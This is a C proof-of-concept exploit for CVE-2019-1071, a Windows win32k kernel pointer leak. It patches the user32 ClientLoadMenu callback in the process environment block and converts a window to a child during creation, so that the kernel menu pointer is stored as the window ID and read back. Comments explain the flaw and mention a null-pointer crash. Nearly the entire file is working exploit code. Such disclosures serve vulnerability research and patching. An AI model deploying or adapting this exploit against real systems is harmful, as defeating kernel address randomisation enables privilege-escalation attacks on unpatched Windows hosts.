// Gil Dabah 2019
// CVE-2019-1071
// Menu object kernel pointer leak.
// A kernel window structure shares the same field to hold either the id of a child window, or a menu pointer for a non-child window.
// We create a window that is non-child first, and then in one (xxxClientLoadMenu) of the callbacks to usermode, we change the window to become a child window.
// This confuses some if statements inside xxxCreateWindow code and causes the menu pointer to be assigned to the window as an id instead, which can later be read.
// Code is tuned for x64, but works on all windows versions and all archs.
// Bonus, there's a null deref also, caused by a null parent HWND, given the same flow of exploitation.

#include <windows.h>
#include <stdio.h>
#include "resource.h" // Just create a win32 project in VS that has a resource and a menu (IDR_MENU1).

HWND g_hWnd = NULL;

typedef LRESULT(CALLBACK *lm_proc)(HMODULE, PVOID);
lm_proc g_orig_lm = NULL;

#define ClientLoadMenu 0x4c

ULONG_PTR GetPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* GetUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)GetPEB() + 0x58);
}

LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		// We need this because otherwise we get the HWND from
		// CreateWindow below and it's too late for our loadmenu hook.
		g_hWnd = (HWND)wParam;
	}
	return 0;
}

LRESULT CALLBACK loadmenu(HMODULE hm, PVOID s)
{
	// This is the trick! It will turn the returned menu object pointer to a window ID
	// because now the window is a child, hence the menu is the identifier of the window from now.
	SetWindowLong(g_hWnd, GWL_STYLE, WS_CHILD);
	printf("client loading menu\n");
	// The call inside to LoadMenuW must succeed (to find a resource),
	// therefore the cls.lpszMenuName should be a real menu eventually.
	return g_orig_lm(hm, s);
}

int main()
{
	WNDCLASS cls = { 0 };
	cls.lpszClassName = "myclass";
	cls.lpfnWndProc = DefWindowProc;
	cls.lpszMenuName = MAKEINTRESOURCE(IDR_MENU1);
	RegisterClass(&cls);

	ULONG_PTR* ptrAddr = &GetUser32Callbacks()[ClientLoadMenu];
	g_orig_lm = *(lm_proc*)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)loadmenu;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);

	SetWindowsHookEx(WH_CBT, hookProc, NULL, GetCurrentThreadId());
	
	// If there's no parent window it will AV on null GETPTI(parentwindow) right before zzzAttachThreadInput inside xxxCreateWindow.
	// CreateWindow(cls.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL /* No parent */, NULL, NULL, NULL);

	CreateWindow(cls.lpszClassName, NULL, 0, 0, 0, 0, 0, GetDesktopWindow(), NULL, NULL, NULL);
	printf("hwnd: %p\nleaked kernel address: %p\n", g_hWnd, (void*)GetWindowLongPtr(g_hWnd, GWL_ID));
	return 0;
}
